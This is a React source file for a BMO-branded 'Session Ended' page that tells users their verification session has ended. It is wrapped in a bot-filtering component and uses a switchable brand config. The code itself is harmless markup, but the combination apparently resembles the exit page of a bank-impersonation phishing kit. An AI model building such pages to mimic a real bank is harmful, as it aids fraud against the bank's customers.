'use client';

/**
 * BMO Terminated/Session Ended Page
 * Centered single-column layout for desktop
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';

export default function TerminatedPage() {
  return (
    <BotGuard>
      {/* Centered Page Header */}
      <div className="page-header">
        <h1>Session Ended</h1>
      </div>

      {/* Centered Single Card Layout */}
      <div className="centered-container">
        <div className="login-card">
          <div className="card-header">
            <h2>Session Ended</h2>
          </div>

          <div className="login-form">
            <p style={{ color: 'var(--bmo-dark)', fontSize: '16px', fontWeight: 500, textAlign: 'center' }}>
              Your verification session has ended.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '14px', textAlign: 'center', marginTop: '8px' }}>
              This may be due to inactivity or the session was completed.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '14px', textAlign: 'center', marginTop: '24px' }}>
              If you believe this was an error, please contact our support team for assistance.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '13px', textAlign: 'center', marginTop: '32px' }}>
              Need help? Contact {currentBrand.companyName} support
            </p>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
